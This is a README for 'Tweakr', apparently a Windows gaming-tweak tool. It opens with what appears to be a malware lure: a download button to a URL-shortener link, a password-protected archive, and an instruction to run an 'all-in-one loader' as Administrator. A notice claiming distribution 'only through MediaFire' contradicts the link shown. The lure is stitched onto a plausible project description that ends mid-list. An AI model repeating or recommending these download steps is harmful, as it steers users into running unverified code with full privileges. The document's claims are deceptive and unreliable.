<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Tweakr

A small Windows desktop tool to optimize common gaming and latency tweaks without digging through `regedit` and PowerShell manually YET.

Built with Electron, React, and Tailwind.

## What it does

- **Mouse Acceleration**: Forces 1:1 raw pointer input by clearing Windows mouse thresholds and speed curves.
- **Nagle's Algorithm**: Sets `TcpAckFrequency` and `TCPNoDelay` to 1 across active network interfaces to cut down on packet buffering/ping latency in games.
- **Fullscreen Optimization & Game DVR**: Disables Windows background recording, Xbox Game Bar capture, and DWM composition delays.
- **Power Scheme**: Switches the active power plan to High Performance (and duplicates the hidden plan if Windows 11 removed it).
- **GPU Stats**: Quick hardware readout and status bar in the bottom panel.

All tweaks can be toggled on and off directly in the UI.

## Building from Source

If you want to build or run the project locally:

```bash
# Install packages
npm install

# Run dev mode
npm start

# Build production installer
npx electron-vite build
npx electron-builder --win


---

# Security

Tweakr interacts with Windows registry keys (`HKCU` and `HKLM`) and runs system commands like `powercfg` to apply performance changes. 

Because the app runs with administrative privileges, keeping IPC communication safe and preventing arbitrary command execution is a priority.

## Reporting an Issue

If you find a security flaw or an issue with how system commands are executed:

1. **Please do not open a public issue.**
